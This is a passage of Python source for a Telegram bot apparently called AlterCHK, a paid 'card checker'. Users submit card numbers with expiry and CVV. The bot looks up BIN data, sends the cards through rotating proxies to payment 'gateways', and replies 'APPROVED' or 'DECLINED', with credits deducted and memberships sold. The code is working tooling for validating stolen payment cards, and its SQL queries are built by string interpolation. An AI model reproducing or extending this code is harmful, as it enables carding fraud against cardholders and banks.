            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        
    result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    result = json.loads(json.dumps(result[0]))
    Credits = result['Creditos']
    if int(Credits) < 10:
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text="<b>Insufficient Credits.</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDti import CMDti
        CheckRecive_start = await CMDti(CcVerify, CheckedP[1])
        if (CheckRecive_start[0] == 'Approved') :
            CheckRecive = CheckRecive_start[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive_start[1].find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive_start[1]} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
            CheckRecive = CheckRecive_start[1]
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            total_count = "1" if len(CheckRecive_start) > 0 and CheckRecive_start[0] in ["Approved"] else 0
            result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
            Credits = result['Creditos']
            new_credits = int(Credits) - int(total_count)
            await ConnectDB.run_query(f"UPDATE pruebas SET Creditos='{new_credits}' WHERE ID='{message.from_user.id}'")
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["od"])
async def CMDpez(message: types.Message):
    NameGateway = 'Gateway 🔥 Olimpo [ CCN Auth ]'
    TwoNameGateway = 'Gateway ↯ Olimpo [ CCN Auth ]'
    ThreeGateway = 'Gateway 🔥 Olimpo [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('od')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if not await CheckAccessPrivate(message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, you do not have access to use this command!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
